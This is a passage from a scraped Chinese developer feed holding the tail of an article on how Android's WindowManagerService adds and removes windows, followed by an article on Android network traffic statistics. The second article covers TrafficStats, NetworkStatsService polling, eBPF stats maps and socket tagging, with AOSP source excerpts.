        <span class="hljs-comment">// the base layer of the new window is below the current</span>
        <span class="hljs-comment">// layer of the target window, then adjust the wallpaper.</span>
        <span class="hljs-comment">// This is to avoid a new window being placed between the</span>
        <span class="hljs-comment">// wallpaper and its target.</span>
        displayContent.pendingLayoutChanges |= FINISH_LAYOUT_REDO_WALLPAPER;
    }
}
...
</code></pre>
<p>先创建了 WindowState，它存有窗口的所有的状态信息，在 WMS 中它代表一个窗口。在创建 WindowState 传入的参数中，this 指的是 WMS，client 指的是 IWindow，IWindow 会将 WMS 中窗口管理的操作回调给 ViewRootImpl，token 指的是 WindowToken ，紧接着分别判断请求添加窗口的客户端是否已经死亡、窗口的
DisplayContent 是否为 null，如果是则不会再执行下面的代码逻辑。然后调用了 DisplayPolicy 的 adiustWindowParamsLw() 方法，此方法会根据窗口的 type 对窗口的 LayoutParams 的一些成员变量进行修改。然后调用 DisplayPolicy 的 validateAddingWindowLw() 方法，用于检查是否可以把这个窗口添加到系统中。接着将 WindowState 添加到 mWindowMap 中，然后将 WindowState 添加到该 WindowState 对应的 WindowToken 中（实际是保存在 WndowToken 的父类 WindowContainer 中），这样 WindowToken 就包含了同一个组件的 WindowState。</p>
<h3 data-id="heading-13">3.4 addWindow()方法总结</h3>
<p>addWindow() 方法分了 3 个部分来进行讲解，主要就是做了下面 4 件事:</p>
<ol>
<li>对所要添加的窗口进行检查，如果窗口不满足一些条件，就不会再执行下面的代码逻辑。</li>
<li>WindowToken 相关的处理，比如有的窗口类型需要提供 WindowToken ，没有提供的话就不会执行下面的代码逻辑，有的窗口类型则可以由 WMS 隐式创建 WindowToken。</li>
<li>WindowState的创建和相关处理，将 WindowToken 和 WindowState 相关联。</li>
<li>创建和配置 DisplayContent，完成窗口添加到系统前的准备工作。</li>
</ol>
<h2 data-id="heading-14">四. Window 的删除过程</h2>
<p>Window 的删除过程会调用 WMS 的 removeWindow() 方法：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">removeWindow</span><span class="hljs-params">(Session session, IWindow client)</span> {
    <span class="hljs-keyword">synchronized</span> (mGlobalLock) {
        <span class="hljs-type">WindowState</span> <span class="hljs-variable">win</span> <span class="hljs-operator">=</span> windowForClientLocked(session, client, <span class="hljs-literal">false</span>); <span class="hljs-comment">// 1</span>
        <span class="hljs-keyword">if</span> (win != <span class="hljs-literal">null</span>) {
            win.removeIfPossible(); <span class="hljs-comment">// 2</span>
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// Remove embedded window map if the token belongs to an embedded window</span>
        mEmbeddedWindowController.remove(client);
    }
}
</code></pre>
<p>在注释 1 处获取 Window 对应的 WindowState，WindowState 用于保存窗口的信息，在 WMS 中它用来描述一个窗口。接着在注释 2 处调用 WindowState 的 removelfPossible() 方法，如下所示:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">removeIfPossible</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.removeIfPossible();
    removeIfPossible(<span class="hljs-literal">false</span> <span class="hljs-comment">/*keepVisibleDeadWindow*/</span>);
    immediatelyNotifyBlastSync();
}
</code></pre>
<p>里面接着又调用了带参数的 removeIfPossible() 方法：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeIfPossible</span><span class="hljs-params">(<span class="hljs-type">boolean</span> keepVisibleDeadWindow)</span> {
    <span class="hljs-comment">// 条件判断过滤，满足其中一个条件就会 return，推迟删除操作</span>
    ...
    removeImmediately(); <span class="hljs-comment">// 1</span>
    <span class="hljs-comment">// Removing a visible window will effect the computed orientation</span>
    <span class="hljs-comment">// So just update orientation if needed.</span>
    <span class="hljs-keyword">if</span> (wasVisible) {
        <span class="hljs-keyword">final</span> <span class="hljs-type">DisplayContent</span> <span class="hljs-variable">displayContent</span> <span class="hljs-operator">=</span> getDisplayContent();
        <span class="hljs-keyword">if</span> (displayContent.updateOrientation()) {
            displayContent.sendNewConfiguration();
        }
    }
    mWmService.updateFocusedWindowLocked(isFocused()
                    ? UPDATE_FOCUS_REMOVING_FOCUS
                    : UPDATE_FOCUS_NORMAL,
            <span class="hljs-literal">true</span> <span class="hljs-comment">/*updateInputWindows*/</span>);
}
</code></pre>
<p>removelfPossible() 方法和它的名字一样，并不是直接执行删除操作的，而是进行多个条件判断过滤，满足其中一个条件就会 return，推迟删除操作。比如 View 正在运行一个动画这时就得推迟删除操作，直到动画完成。通过这些条件判断过滤就会执行注释 1 处的 removeImmediately() 方法:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">removeImmediately</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.removeImmediately();

    <span class="hljs-keyword">if</span> (mRemoved) { <span class="hljs-comment">// 1</span>
        <span class="hljs-comment">// Nothing to do.</span>
        ProtoLog.v(WM_DEBUG_ADD_REMOVE,
                <span class="hljs-string">"WS.removeImmediately: %s Already removed..."</span>, <span class="hljs-built_in">this</span>);
        <span class="hljs-keyword">return</span>;
    }

    mRemoved = <span class="hljs-literal">true</span>; 

    ...
    dc.getDisplayPolicy().removeWindowLw(<span class="hljs-built_in">this</span>); <span class="hljs-comment">// 2</span>

    disposeInputChannel();

    mWinAnimator.destroyDeferredSurfaceLocked();
    mWinAnimator.destroySurfaceLocked();
    mSession.windowRemovedLocked(); <span class="hljs-comment">// 3</span>
    <span class="hljs-keyword">try</span> {
        mClient.asBinder().unlinkToDeath(mDeathRecipient, <span class="hljs-number">0</span>);
    } <span class="hljs-keyword">catch</span> (RuntimeException e) {
        <span class="hljs-comment">// Ignore if it has already been removed (usually because</span>
        <span class="hljs-comment">// we are doing this as part of processing a death note.)</span>
    }

    mWmService.postWindowRemoveCleanupLocked(<span class="hljs-built_in">this</span>); <span class="hljs-comment">// 4</span>
}
</code></pre>
<p>removelmmediately() 方法如同它的名字一样，用于立即进行删除操作。在注释 1 处的 mRemoved 为 true 意味着正在执行删除 Window 操作。在注释 2 处如果当前要删除的 Window 是 StatusBar 或者 NavigationBar，就会将这个 Window 从对应的控制器中删除。在注释 3 处将对应的 Session 从 WMS 的 ArraySet&lt;Session&gt; 类型的参数 mSessions 中删除并清除 Session 对应的 SurfaceSession 资源（SurfaceSession 是 SurfaceFlinger 的一个连接，通过这个连接可以创建 1 个或者多个 Surface 并渲染到屏幕上）。在注释 4 处调用了 WMS 的 postWindowRemoveCleanupLocked() 方法用于对 View 进行一些集中的清理工作。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[android网络流量统计]]></title>    <link>https://juejin.cn/post/7602965400808849458</link>    <guid>https://juejin.cn/post/7602965400808849458</guid>    <pubDate>2026-02-05T08:38:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602965400808849458" data-draft-id="7603160727717576755" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="android网络流量统计"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-05T08:38:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户341408199125"/> <meta itemprop="url" content="https://juejin.cn/user/570004686782272"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            android网络流量统计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/570004686782272/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户341408199125
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:38:12.000Z" title="Thu Feb 05 2026 08:38:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">📊 <strong>Android 网络流量统计架构全解析</strong></h2>
<p>Android 网络流量统计是一个<strong>多层次、高度优化</strong>的系统，从内核层到应用层提供了完整的流量监控和统计能力。让我为您详细解析：</p>
<hr/>
<h2 data-id="heading-1">🏗️ <strong>整体架构图</strong></h2>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────┐
│                    应用层 (App Layer)                        │
│  - TrafficStats API (简单查询)                               │
│  - NetworkStatsManager (历史数据、按时间段查询)              │
└──────────────┬──────────────────────────────────────────────┘
               │ Binder IPC
               ↓
┌─────────────────────────────────────────────────────────────┐
│         Framework 层 (System Server)                        │
│  - NetworkStatsService                                      │
│    * 周期性轮询 (Poll)                                      │
│    * 持久化存储 (NetworkStatsCollection)                    │
│    * 流量告警 (Data Usage Alert)                            │
│  - NetworkStatsFactory (数据解析)                           │
└──────────────┬──────────────────────────────────────────────┘
               │ JNI
               ↓
┌─────────────────────────────────────────────────────────────┐
│           Native 层 (libnetworkstats)                       │
│  - BpfNetworkStats<span class="hljs-selector-class">.cpp</span>                                      │
│  - 读取 eBPF Map                                            │
│  - 解析统计数据                                              │
└──────────────┬──────────────────────────────────────────────┘
               │ eBPF System Calls
               ↓
┌─────────────────────────────────────────────────────────────┐
│              内核层 (Linux Kernel)                          │
│  ┌────────────────────────────────────────────────────┐    │
│  │  eBPF 程序 (Android <span class="hljs-number">9</span>+, Kernel <span class="hljs-number">4.9</span>+)               │    │
│  │  - cgroupskb/ingress/stats                        │    │
│  │  - cgroupskb/egress/stats                         │    │
│  │  - 挂载点: /sys/fs/cgroup/                        │    │
│  └────────────┬───────────────────────────────────────┘    │
│               │ 写入                                        │
│               ↓                                            │
│  ┌────────────────────────────────────────────────────┐    │
│  │  eBPF Maps (内存中的 Hash Table)                   │    │
│  │  - cookie_tag_map    (Socket → UID/Tag)           │    │
│  │  - uid_stats_map     (UID 流量统计)               │    │
│  │  - app_uid_stats_map (App 流量统计)               │    │
│  │  - iface_stats_map   (网卡流量统计)               │    │
│  │  - tag_stats_map     (Tag 流量统计)               │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │  老旧设备 (Android <span class="hljs-number">8</span>-, Kernel &lt; <span class="hljs-number">4.9</span>)               │    │
│  │  - xt_qtaguid (Netfilter 模块)                    │    │
│  │  - /proc/net/xt_qtaguid/stats                     │    │
│  └────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<hr/>
<h2 data-id="heading-2">1️⃣ <strong>应用层 API：TrafficStats</strong></h2>
<h3 data-id="heading-3"><strong>基本用法</strong></h3>
<pre><code class="hljs language-44:82:packages_modules_Connectivity/framework-t/src/android/net/TrafficStats.java" lang="44:82:packages_modules_Connectivity/framework-t/src/android/net/TrafficStats.java">/**
 * Class that provides network traffic statistics. These statistics include
 * bytes transmitted and received and network packets transmitted and received,
 * over all interfaces, over the mobile interface, and on a per-UID basis.
 * &lt;p&gt;
 * These statistics may not be available on all platforms. If the statistics are
 * not supported by this device, {@link #UNSUPPORTED} will be returned.
 * &lt;p&gt;
 * Note that the statistics returned by this class reset and start from zero
 * after every reboot. To access more robust historical network statistics data,
 * use {@link NetworkStatsManager} instead.
 */
public class TrafficStats {
    static {
        System.loadLibrary("framework-connectivity-tiramisu-jni");
    }

    private static final String TAG = TrafficStats.class.getSimpleName();
    /**
     * The return value to indicate that the device does not support the statistic.
     */
    public final static int UNSUPPORTED = -1;

    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long KB_IN_BYTES = 1024;
    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long MB_IN_BYTES = KB_IN_BYTES * 1024;
    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long GB_IN_BYTES = MB_IN_BYTES * 1024;
    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long TB_IN_BYTES = GB_IN_BYTES * 1024;
    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long PB_IN_BYTES = TB_IN_BYTES * 1024;

    /**
     * Special UID value used when collecting {@link NetworkStatsHistory} for
     * removed applications.
     *
     * @hide
     */
    public static final int UID_REMOVED = -4;
</code></pre>
<h3 data-id="heading-4"><strong>核心方法</strong></h3>
<pre><code class="hljs language-917:967:packages_modules_Connectivity/framework-t/src/android/net/TrafficStats.java" lang="917:967:packages_modules_Connectivity/framework-t/src/android/net/TrafficStats.java">    /**
     * Return number of bytes transmitted by the given UID since device boot.
     * Counts packets across all network interfaces, and always increases
     * monotonically since device boot. Statistics are measured at the network
     * layer, so they include both TCP and UDP usage.
     * &lt;p&gt;
     * Before {@link android.os.Build.VERSION_CODES#JELLY_BEAN_MR2}, this may
     * return {@link #UNSUPPORTED} on devices where statistics aren't available.
     * &lt;p&gt;
     * Starting in {@link android.os.Build.VERSION_CODES#N} this will only
     * report traffic statistics for the calling UID. It will return
     * {@link #UNSUPPORTED} for all other UIDs for privacy reasons. To access
     * historical network statistics belonging to other UIDs, use
     * {@link NetworkStatsManager}.
     *
     * @see android.os.Process#myUid()
     * @see android.content.pm.ApplicationInfo#uid
     */
    public static long getUidTxBytes(int uid) {
        try {
            return getStatsService().getUidStats(uid, TYPE_TX_BYTES);
        } catch (RemoteException e) {
            throw e.rethrowFromSystemServer();
        }
    }

    /**
     * Return number of bytes received by the given UID since device boot.
     * Counts packets across all network interfaces, and always increases
     * monotonically since device boot. Statistics are measured at the network
     * layer, so they include both TCP and UDP usage.
     * &lt;p&gt;
     * Before {@link android.os.Build.VERSION_CODES#JELLY_BEAN_MR2}, this may return
     * {@link #UNSUPPORTED} on devices where statistics aren't available.
     * &lt;p&gt;
     * Starting in {@link android.os.Build.VERSION_CODES#N} this will only
     * report traffic statistics for the calling UID. It will return
     * {@link #UNSUPPORTED} for all other UIDs for privacy reasons. To access
     * historical network statistics belonging to other UIDs, use
     * {@link NetworkStatsManager}.
     *
     * @see android.os.Process#myUid()
     * @see android.content.pm.ApplicationInfo#uid
     */
    public static long getUidRxBytes(int uid) {
        try {
            return getStatsService().getUidStats(uid, TYPE_RX_BYTES);
        } catch (RemoteException e) {
            throw e.rethrowFromSystemServer();
        }
    }
</code></pre>
<p><strong>示例代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 获取当前 App 的流量</span>
<span class="hljs-type">long</span> <span class="hljs-variable">txBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxBytes(Process.myUid());
<span class="hljs-type">long</span> <span class="hljs-variable">rxBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxBytes(Process.myUid());

<span class="hljs-comment">// 获取移动网络总流量</span>
<span class="hljs-type">long</span> <span class="hljs-variable">mobileTx</span> <span class="hljs-operator">=</span> TrafficStats.getMobileTxBytes();
<span class="hljs-type">long</span> <span class="hljs-variable">mobileRx</span> <span class="hljs-operator">=</span> TrafficStats.getMobileRxBytes();

<span class="hljs-comment">// 获取总流量</span>
<span class="hljs-type">long</span> <span class="hljs-variable">totalTx</span> <span class="hljs-operator">=</span> TrafficStats.getTotalTxBytes();
<span class="hljs-type">long</span> <span class="hljs-variable">totalRx</span> <span class="hljs-operator">=</span> TrafficStats.getTotalRxBytes();
</code></pre>
<hr/>
<h2 data-id="heading-5">2️⃣ <strong>System Server：NetworkStatsService</strong></h2>
<h3 data-id="heading-6"><strong>核心职责</strong></h3>
<ol>
<li><strong>周期性轮询（Polling）</strong></li>
<li><strong>数据持久化存储</strong></li>
<li><strong>流量告警机制</strong></li>
<li><strong>多维度统计（接口、UID、Tag、时间段）</strong></li>
</ol>
<h3 data-id="heading-7"><strong>轮询机制</strong></h3>
<pre><code class="hljs language-2593:2733:packages_modules_Connectivity/service-t/src/com/android/server/net/NetworkStatsService.java" lang="2593:2733:packages_modules_Connectivity/service-t/src/com/android/server/net/NetworkStatsService.java">    /**
     * Periodic poll operation, reading current statistics and recording into
     * {@link NetworkStatsHistory}.
     */
    @GuardedBy("mStatsLock")
    private void performPollLocked(int flags, @Nullable PollEvent event) {
        if (!mSystemReady) return;
        if (LOGV) Log.v(TAG, "performPollLocked(flags=0x" + Integer.toHexString(flags) + ")");
        Trace.traceBegin(TRACE_TAG_NETWORK, "performPollLocked");

        if (mSupportEventLogger) {
            mEventLogger.logPollEvent(flags, event);
        }

        final boolean persistNetwork = (flags &amp; FLAG_PERSIST_NETWORK) != 0;
        final boolean persistUid = (flags &amp; FLAG_PERSIST_UID) != 0;
        final boolean persistForce = (flags &amp; FLAG_PERSIST_FORCE) != 0;

        performPollFromProvidersLocked();

        // TODO: consider marking "untrusted" times in historical stats
        final long currentTime = mClock.millis();

        try {
</code></pre>
<p><strong>轮询触发条件</strong>：</p>
<ul>
<li>⏰ <strong>定期轮询</strong>：默认 30 分钟</li>
<li>📡 <strong>网络状态变化</strong>：切换 WiFi/移动网络</li>
<li>🚨 <strong>流量告警</strong>：达到预设阈值</li>
<li>📊 <strong>系统事件</strong>：开关机、UID 移除、dumpsys 命令</li>
</ul>
<h3 data-id="heading-8"><strong>数据存储结构</strong></h3>
<pre><code class="hljs language-python" lang="python">/data/system/netstats/
├── netstats_xt.<span class="hljs-built_in">bin</span>        <span class="hljs-comment"># 接口级别统计 (Interface)</span>
├── netstats_uid.<span class="hljs-built_in">bin</span>       <span class="hljs-comment"># UID 级别统计</span>
└── netstats_uid_tag.<span class="hljs-built_in">bin</span>   <span class="hljs-comment"># UID + Tag 统计</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">3️⃣ <strong>内核层：eBPF vs xt_qtaguid</strong></h2>
<h3 data-id="heading-10"><strong>eBPF（Android 9+，Kernel 4.9+）</strong></h3>
<h4 data-id="heading-11"><strong>优势</strong></h4>
<ul>
<li>✅ <strong>性能极高</strong>：内核态直接处理，无需上下文切换</li>
<li>✅ <strong>实时性好</strong>：每个数据包都被精确统计</li>
<li>✅ <strong>可扩展性强</strong>：通过 Map 轻松扩展统计维度</li>
</ul>
<h4 data-id="heading-12"><strong>核心 eBPF 程序</strong></h4>
<pre><code class="hljs language-493:525:packages_modules_Connectivity/bpf_progs/netd.c" lang="493:525:packages_modules_Connectivity/bpf_progs/netd.c">#define TAG_SYSTEM_DNS 0xFFFFFF82
    if (tag == TAG_SYSTEM_DNS &amp;&amp; uid == AID_DNS) {
        uid = sock_uid;
        if (match == DROP_UNLESS_DNS) match = PASS;
    } else {
        if (match == DROP_UNLESS_DNS) match = DROP;
    }

    // If an outbound packet is going to be dropped, we do not count that traffic.
    if (egress.egress &amp;&amp; (match == DROP)) return DROP;

    StatsKey key = {.uid = uid, .tag = tag, .counterSet = 0, .ifaceIndex = skb-&gt;ifindex};

    uint8_t* counterSet = bpf_uid_counterset_map_lookup_elem(&amp;uid);
    if (counterSet) key.counterSet = (uint32_t)*counterSet;

    uint32_t mapSettingKey = CURRENT_STATS_MAP_CONFIGURATION_KEY;
    uint32_t* selectedMap = bpf_configuration_map_lookup_elem(&amp;mapSettingKey);

    if (!selectedMap) return PASS;  // cannot happen, needed to keep bpf verifier happy

    do_packet_tracing(skb, egress, uid, tag, enable_tracing, kver);
    update_stats_with_config(*selectedMap, skb, &amp;key, egress, kver);
    update_app_uid_stats_map(skb, &amp;uid, egress, kver);

    // We've already handled DROP_UNLESS_DNS up above, thus when we reach here the only
    // possible values of match are DROP(0) or PASS(1), however we need to use
    // "match &amp;= 1" before 'return match' to help the kernel's bpf verifier,
    // so that it can be 100% certain that the returned value is always 0 or 1.
    // We use assembly so that it cannot be optimized out by a too smart compiler.
    asm("%0 &amp;= 1" : "+r"(match));
    return match;
}
</code></pre>
<h4 data-id="heading-13"><strong>eBPF Maps 结构</strong></h4>
<pre><code class="hljs language-103:129:packages_modules_Connectivity/bpf_progs/netd.h" lang="103:129:packages_modules_Connectivity/bpf_progs/netd.h">// app_uid_stats_map:   key:  4 bytes, value: 32 bytes, cost: 1062784 bytes    =  1063Kbytes
// uid_stats_map:       key: 16 bytes, value: 32 bytes, cost: 1142848 bytes    =  1143Kbytes
// tag_stats_map:       key: 16 bytes, value: 32 bytes, cost: 1142848 bytes    =  1143Kbytes
// iface_index_name_map:key:  4 bytes, value: 16 bytes, cost:   80896 bytes    =    81Kbytes
// iface_stats_map:     key:  4 bytes, value: 32 bytes, cost:   97024 bytes    =    97Kbytes
// dozable_uid_map:     key:  4 bytes, value:  1 bytes, cost:  145216 bytes    =   145Kbytes
// standby_uid_map:     key:  4 bytes, value:  1 bytes, cost:  145216 bytes    =   145Kbytes
// powersave_uid_map:   key:  4 bytes, value:  1 bytes, cost:  145216 bytes    =   145Kbytes
// packet_trace_ringbuf:key:  0 bytes, value: 24 bytes, cost:   32768 bytes    =    32Kbytes
// total:                                                                         4962Kbytes
// It takes maximum 4.9MB kernel memory space if all maps are full, which requires any devices
// running this module to have a memlock rlimit to be larger then 5MB. In the old qtaguid module,
// we don't have a total limit for data entries but only have limitation of tags each uid can have.
// (default is 1024 in kernel);

// 'static' - otherwise these constants end up in .rodata in the resulting .o post compilation
static const int COOKIE_UID_MAP_SIZE = 10000;
static const int UID_COUNTERSET_MAP_SIZE = 4000;
static const int APP_STATS_MAP_SIZE = 10000;
static const int STATS_MAP_SIZE = 5000;
static const int IFACE_INDEX_NAME_MAP_SIZE = 1000;
static const int IFACE_STATS_MAP_SIZE = 1000;
static const int CONFIGURATION_MAP_SIZE = 2;
static const int UID_OWNER_MAP_SIZE = 4000;
static const int INGRESS_DISCARD_MAP_SIZE = 100;
static const int PACKET_TRACE_BUF_SIZE = 32 * 1024;
static const int DATA_SAVER_ENABLED_MAP_SIZE = 1;
</code></pre>
<p><strong>关键 Maps</strong>：</p>
<ul>
<li>🔑 <strong>cookie_tag_map</strong>：Socket Cookie → (UID, Tag) 映射</li>
<li>📊 <strong>uid_stats_map</strong>：UID 流量统计（RX/TX Bytes &amp; Packets）</li>
<li>🏷️ <strong>tag_stats_map</strong>：Tag 流量统计（用于 Socket Tagging）</li>
<li>🌐 <strong>iface_stats_map</strong>：网卡接口流量统计</li>
</ul>
<h3 data-id="heading-14"><strong>xt_qtaguid（老旧设备）</strong></h3>
<p><strong>文件路径</strong>：<code>/proc/net/xt_qtaguid/stats</code></p>
<p><strong>缺点</strong>：</p>
<ul>
<li>❌ 性能较差（Netfilter 钩子开销大）</li>
<li>❌ 无法精确统计某些场景（如 eBPF offload）</li>
<li>❌ 已在 Android 9+ 废弃</li>
</ul>
<hr/>
<h2 data-id="heading-15">4️⃣ <strong>特殊机制：Socket Tagging</strong></h2>
<h3 data-id="heading-16"><strong>什么是 Socket Tagging？</strong></h3>
<p>允许应用为 Socket 打上自定义标签（Tag），实现<strong>更细粒度的流量统计</strong>。</p>
<h3 data-id="heading-17"><strong>使用场景</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 在发起网络请求前</span>
TrafficStats.setThreadStatsTag(<span class="hljs-number">0xDEADBEEF</span>); <span class="hljs-comment">// 设置 Tag</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();
    <span class="hljs-comment">// 这个连接的流量会被统计到 Tag 0xDEADBEEF</span>
} <span class="hljs-keyword">finally</span> {
    TrafficStats.clearThreadStatsTag(); <span class="hljs-comment">// 清除 Tag</span>
}
</code></pre>
<p><strong>实际应用</strong>：</p>
<ul>
<li>📱 <strong>多账号 App</strong>：区分不同账号的流量</li>
<li>🎮 <strong>游戏 App</strong>：区分游戏内不同功能的流量（聊天 vs 战斗）</li>
<li>📺 <strong>视频 App</strong>：区分视频流量 vs 广告流量</li>
</ul>
